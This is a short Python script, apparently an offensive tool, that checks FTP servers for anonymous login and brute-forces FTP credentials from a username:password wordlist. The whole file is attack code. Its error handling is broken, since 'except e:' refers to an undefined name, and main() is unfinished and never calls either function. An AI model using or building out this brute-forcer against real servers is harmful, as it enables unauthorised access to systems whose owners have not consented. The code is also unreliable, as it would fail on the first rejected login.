import ftplib
import optparse

def loginWithAnonymous(host):

    try:
        connection = ftplib.FTP(host)
        connection.login('Anonymous','yolo@gmail.com')
        print("[+] Connection Successful.  Host is Vulnerable to Anonymous FTP Logins!")
        connection.quit()
        return True

    except e:
        print("[-] Connection Not Possible via Anonymous Login")
        return False

def loginBruteForce(host, credentials):

    file = open(credentials, 'r')

    for userDetails in file:
        username = userDetails.split(':')[0]
        password = userDetails.split(':')[1].strip('\r').strip('\n')

        try:
            connection = ftplib.FTP(host)
            connection.login(username, password)
            print("[+] Login Success! Credentials Found!")
            connection.quit()
            return (username, password)

        except e:
            print("[*] Continuing to Search ...")

    print("[-] Failed to Brute Force into FTP Server")
    return None

def main():
    command = optparse.OptionParser('usage%prog -h ')

if __name__ == "__main__":
    main()
